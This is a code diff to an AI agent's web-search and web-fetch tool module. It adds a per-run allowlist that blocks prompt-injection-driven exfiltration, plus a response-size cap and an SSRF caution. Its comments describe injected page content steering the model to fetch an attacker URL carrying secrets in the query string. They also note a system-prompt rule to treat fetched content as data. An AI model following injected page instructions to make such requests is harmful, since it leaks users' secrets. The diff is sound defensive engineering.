@@ -22,11 +22,34 @@
  * context. It is read-only and every third-party-visible action still passes
  * through Victoria's [Confirm] gate, so containment holds — but the system
  * prompt tells the model to treat fetched content as data, never instructions.
+ *
+ * ANTI-EXFILTRATION (per-run allowlist): web_fetch's URL is model-controlled,
+ * so injected page content could otherwise steer the model to fetch
+ * `https://attacker/?d=<secret from context>` — a silent outbound exfil
+ * channel with no confirm tap. To block this, web_fetch is restricted to URLs
+ * a web_search ALREADY surfaced EARLIER IN THE SAME AGENT RUN: see
+ * `createWebFetchAllowlist`. Each run gets a fresh allowlist (cross-run
+ * isolation); web_search records every result URL; web_fetch refuses anything
+ * not recorded. The match is by origin+pathname, and the query string must be
+ * EMPTY or exactly one a search surfaced — appending `?d=secret` to an
+ * otherwise-allowlisted host is refused (that is the exfil block).
  */
 
 const WEB_SEARCH_URL = "https://ollama.com/api/web_search";
 const WEB_FETCH_URL = "https://ollama.com/api/web_fetch";
-const TIMEOUT_MS = 15_000;
+/**
+ * Per-web-call upstream timeout. Kept modest (8s) so two back-to-back web
+ * tool calls cannot, on their own, blow the webhook's maxDuration and trigger
+ * a Telegram redelivery — the agent loop also deadline-gates these calls.
+ */
+export const WEB_TOOL_TIMEOUT_MS = 8_000;
+const TIMEOUT_MS = WEB_TOOL_TIMEOUT_MS;
+/**
+ * Defensive cap on an upstream JSON response we read before parsing. The
+ * upstream is Ollama's own trusted API, but an unbounded read is still a cheap
+ * footgun, so we bail if Content-Length (or the materialized body) exceeds it.
+ */
+const MAX_RESPONSE_BYTES = 2_000_000;
 
 /** Max characters of page/snippet text we hand back to the model per result. */
 const MAX_SNIPPET_CHARS = 600;
@@ -97,7 +120,17 @@ async function postJson(
           : `web search upstream error ${status}`;
       return { ok: false, error: reason };
     }
-    return { ok: true, data: await res.json() };
+    // Bounded read before parse: refuse an absurdly large body (cheap guard;
+    // upstream is Ollama's trusted API, but never trust a Content-Length).
+    const declaredLen = Number(res.headers.get("content-length") || "");
+    if (Number.isFinite(declaredLen) && declaredLen > MAX_RESPONSE_BYTES) {
+      return { ok: false, error: "web search response too large" };
+    }
+    const raw = await res.text();
+    if (raw.length > MAX_RESPONSE_BYTES) {
+      return { ok: false, error: "web search response too large" };
+    }
+    return { ok: true, data: JSON.parse(raw) as unknown };
   } catch (error) {
     const timedOut = error instanceof Error && error.name === "TimeoutError";
     return {
@@ -146,6 +179,10 @@ export async function ollamaWebSearch(
 /** Fetch a single page's readable text. Read-only; content is UNTRUSTED. */
 export async function ollamaWebFetch(url: string): Promise<WebFetchOutcome> {
   const target = (url || "").trim();
+  // SSRF: safety here currently depends on Ollama PROXYING the fetch — OUR
+  // server never connects to the target host, so a private-IP/localhost URL
+  // can't reach our internal network. If anyone switches this to a direct
+  // server-side fetch, a private-IP/host allowlist becomes MANDATORY.
   if (!/^https?:\/\//i.test(target)) {
     return { ok: false, error: "url must start with http:// or https://" };
   }
@@ -167,5 +204,86 @@ export async function ollamaWebFetch(url: string): Promise<WebFetchOutcome> {
     title: clip(data.title, 200) || target,
     url: target,
     text,
+  };
+}
+
+// --- per-run web_fetch allowlist (anti-exfiltration) --------------------------
+
+/**
+ * The message web_fetch returns when asked to open a URL no web_search in this
+ * run surfaced (or a surfaced URL with a tampered/appended query string).
+ */
+export const WEB_FETCH_NOT_ALLOWLISTED_MESSAGE =
+  "I can only open links from a previous search result in this conversation turn. " +
+  "Search for it first, then I can fetch one of those exact result links.";
+
+export interface WebFetchAllowlist {
+  /** Record a URL a web_search surfaced this run as fetchable. */
+  record(url: string): void;
+  /** Record every URL in a batch of search results. */
+  recordAll(urls: Iterable<string>): void;
+  /** May web_fetch open this URL? (origin+path must match a recorded result;
+   *  query must be empty or exactly one a search surfaced.) */
+  allows(url: string): boolean;
+  /** How many distinct origin+path keys are recorded (diagnostics/tests). */
+  size(): number;
+}
+
+/**
+ * Normalize a URL to its allowlist KEY = origin (scheme+host[:port], lowercased
+ * by the URL parser) + pathname with any single trailing slash stripped (root
+ * "/" kept). The fragment and query are NOT part of the key — the query is
+ * matched separately so we can require it be empty or exactly-as-surfaced.
+ * Returns null for anything that isn't a parseable http(s) URL.
+ */
+function allowlistKey(rawUrl: string): { key: string; search: string } | null {
+  let u: URL;
+  try {
+    u = new URL((rawUrl || "").trim());
+  } catch {
+    return null;
+  }
+  if (u.protocol !== "http:" && u.protocol !== "https:") return null;
+  let path = u.pathname || "/";
+  if (path.length > 1 && path.endsWith("/")) path = path.slice(0, -1);
+  return { key: `${u.origin}${path}`, search: u.search };
+}
+
+/**
+ * Fresh per-agent-run allowlist. web_search feeds it every result URL; web_fetch
+ * checks against it. MATCH RULE (documented): a fetch URL is allowed iff its
+ * origin+pathname matches a recorded search result AND its query string is
+ * either empty OR byte-identical to one a search surfaced for that same
+ * origin+pathname. This blocks `…/path?d=<exfil>` on an otherwise-allowlisted
+ * host because that exact query was never surfaced. A new run = new allowlist,
+ * so URLs from a different run are never fetchable (cross-run isolation).
+ */
+export function createWebFetchAllowlist(): WebFetchAllowlist {
+  // origin+pathname → set of exact query strings (including "") search surfaced.
+  const allowed = new Map<string, Set<string>>();
+  return {
+    record(url: string) {
+      const parsed = allowlistKey(url);
+      if (!parsed) return;
+      const set = allowed.get(parsed.key) ?? new Set<string>();
+      set.add(parsed.search);
+      allowed.set(parsed.key, set);
+    },
+    recordAll(urls: Iterable<string>) {
+      for (const u of urls) this.record(u);
+    },
+    allows(url: string): boolean {
+      const parsed = allowlistKey(url);
+      if (!parsed) return false;
+      const queries = allowed.get(parsed.key);
+      if (!queries) return false;
+      // No query is always safe (carries no data); otherwise the query must be
+      // exactly one search surfaced for this origin+path.
+      if (parsed.search === "") return true;
+      return queries.has(parsed.search);
+    },
+    size() {
+      return allowed.size;
+    },
   };
 }
